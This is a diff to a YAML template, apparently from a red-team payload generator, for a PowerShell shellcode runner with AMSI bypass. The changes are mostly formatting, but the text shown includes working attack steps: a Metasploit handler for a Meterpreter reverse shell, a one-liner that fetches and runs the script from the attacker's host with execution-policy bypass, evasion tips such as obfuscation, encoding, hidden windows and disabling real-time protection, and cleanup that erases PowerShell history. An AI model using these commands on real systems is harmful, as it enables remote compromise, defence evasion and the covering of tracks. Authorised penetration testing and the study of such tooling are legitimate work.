@@ -1,5 +1,5 @@
 meta:
-  name: "Simple Shellcode Runner (PowerShell)*"
+  name: "Simple Shellcode Runner (PowerShell)"
   category: "Shellcode Execution"
   description: |
     Simple shellcode runner in PowerShell with AMSI bypass and reflection-based API loading.
@@ -19,7 +19,7 @@ meta:
 
   mitre:
     tactic: "TA0002 - Execution"
-    technique: "T1059.001 - PowerShell"
+    technique: "T1059.001 - Command and Scripting Interpreter: PowerShell"
 
   artifacts:
     - "PowerShell execution with suspicious scripts"
@@ -81,6 +81,10 @@ output:
     ```bash
     msfconsole -x "use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST {{ lhost }}; set LPORT {{ lport }}; set ExitOnSession false; exploit -j"
     ```
+    And host the script:
+    ```bash
+    python3 -m http.server 80
+    ```
 
     # Transfer and Execute (In-Memory)
 
@@ -90,17 +94,11 @@ output:
 
     # Alternative (File-Based)
 
-    **Attacker:**
-    ```bash
-    python3 -m http.server 80
-    ```
-
-    **Target:**
     ```powershell
     powershell -ep bypass -c "IWR -Uri http://{{ lhost }}:/{{ output_file }} -OutFile {{ output_file }}; .\{{ output_file }}"
     ```
 
-    ## Noteses
+    # Notes
 
     - Includes AMSI bypass to evade script scanning
     - Uses reflection for dynamic API resolution (VirtualAlloc, CreateThread, WaitForSingleObject)
@@ -111,7 +109,7 @@ output:
     - Reverse shell connects to `{{ lhost }}:{{ lport }}`
     - Consider Invoke-Obfuscation for additional evasion
 
-    Troubleshooting:
+    # Troubleshooting:
     - AMSI blocks: Bypass may be detected; obfuscate with Invoke-Obfuscation or use -EncodedCommand
     - No connection: Check firewall rules on attacker (allow {{ lport }}/tcp)
     - Script blocked: Windows Defender SmartScreen or AV; try encoding: `[Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes((gc {{ output_file }} -Raw)))`
@@ -119,13 +117,19 @@ output:
     - Hidden window execution: Add `-WindowStyle Hidden` flag
     - May need to disable real-time protection for testing
 
-    Cleanup:
+    # Cleanup:
     On target:
-    $ Remove-Item {{ output_file }} -Force -ErrorAction SilentlyContinue
-    $ Remove-Item (Get-PSReadlineOption).HistorySavePath -ErrorAction SilentlyContinue
+    ```powershell
+    Remove-Item {{ output_file }} -Force -ErrorAction SilentlyContinue
+    Remove-Item (Get-PSReadlineOption).HistorySavePath -ErrorAction SilentlyContinue
+    ```
 
     After testing, remove the script:
-    $ Remove-Item {{ output_file }} -Force
+    ```powershell
+    Remove-Item {{ output_file }} -Force
+    ```
 
     Clear PowerShell history:
-    $ Remove-Item (Get-PSReadlineOption).HistorySavePath
+    ```powershell
+    Remove-Item (Get-PSReadlineOption).HistorySavePath
+    ```
